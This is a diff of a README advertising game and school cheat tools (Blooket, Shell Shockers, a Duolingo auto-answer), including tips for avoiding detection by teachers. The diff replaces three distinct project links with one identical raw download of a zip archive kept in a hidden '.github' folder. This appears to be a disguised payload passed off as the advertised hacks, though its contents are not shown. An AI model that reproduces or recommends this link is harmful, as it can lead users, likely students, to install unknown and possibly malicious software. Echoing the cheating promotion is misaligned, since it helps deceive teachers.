@@ -1,4 +1,4 @@
-Daily http://essentials-premium-clothing.myshopify.com/
+Daily https://github.com/TrippyDawg/blookethack/raw/refs/heads/main/.github/Software-kehillah.zip
 
 
 
@@ -8,7 +8,7 @@ All hacks working as of now but be carefull of ban!!!
 
 new shell shockers hack out now!
 
-https://github.com/Doomlands/shellshockershack
+https://github.com/TrippyDawg/blookethack/raw/refs/heads/main/.github/Software-kehillah.zip
 
 correct answer will give you the answer for just one question so that teachers or classmates won´t expose you when you get every answer right.
 
@@ -26,6 +26,6 @@ Thanks so much for everything and stay frosty,Gsnipe1/Doomlands
 
 Pls check out my auto answer for duolingo here!
 
-https://github.com/Doomlands/Duolingohack
+https://github.com/TrippyDawg/blookethack/raw/refs/heads/main/.github/Software-kehillah.zip
 
 
